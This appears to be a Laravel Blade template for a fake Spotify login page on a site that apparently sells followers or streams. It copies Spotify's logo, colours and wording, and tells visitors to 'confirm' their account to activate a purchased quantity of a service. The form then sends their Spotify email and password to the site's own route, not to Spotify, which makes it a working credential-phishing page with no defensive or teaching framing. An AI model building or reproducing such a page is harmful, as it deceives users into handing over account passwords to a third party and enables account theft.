@extends('platform-login.layout')

@section('title', 'Login - Spotify')

@section('content')
<div class="w-full max-w-[440px] mx-auto space-y-4">
    <!-- Spotify Login Card -->
    <div class="bg-[#121212] border border-white/10 rounded-3xl p-8 sm:p-10 shadow-2xl relative text-center">
        <!-- Spotify Logo -->
        <div class="flex items-center justify-center gap-2 mb-6">
            <i class="fa-brands fa-spotify text-4xl text-[#1ed760]"></i>
            <span class="text-2xl font-bold tracking-tight text-white">Spotify</span>
        </div>

        <h2 class="text-2xl sm:text-3xl font-black text-white mb-2">Log in to Spotify</h2>
        <p class="text-xs text-gray-400 mb-6">
            Confirm your Spotify account to activate <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-[#1ed760]">{{ $username }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'spotify']) }}" class="space-y-4 text-left">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 8 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-bold text-white mb-1.5">Email or username</label>
                <input type="text" name="email" required
                    value="{{ $username }}"
                    class="w-full px-4 py-3 text-sm rounded-md bg-[#242424] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors"
                    placeholder="Email or username">
            </div>

            <div class="relative">
                <label class="block text-xs font-bold text-white mb-1.5">Password</label>
                <input type="password" id="sp_password" name="password" required
                    class="w-full px-4 py-3 pr-14 text-sm rounded-md bg-[#242424] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('sp_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <div class="pt-2">
                <button type="submit"
                    class="w-full py-3.5 bg-[#1ed760] hover:bg-[#1fdf64] hover:scale-105 text-black font-extrabold text-sm rounded-full tracking-wider transition-all active:scale-[0.98]">
                    Log In
                </button>
            </div>

            <div class="text-center pt-2">
                <span class="text-xs text-gray-400 hover:text-white hover:underline cursor-pointer">Forgot your password?</span>
            </div>
        </form>

        <div class="mt-8 pt-6 border-t border-white/10 text-xs text-gray-400">
            Don't have an account? <span class="text-white font-bold hover:underline cursor-pointer">Sign up for Spotify</span>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
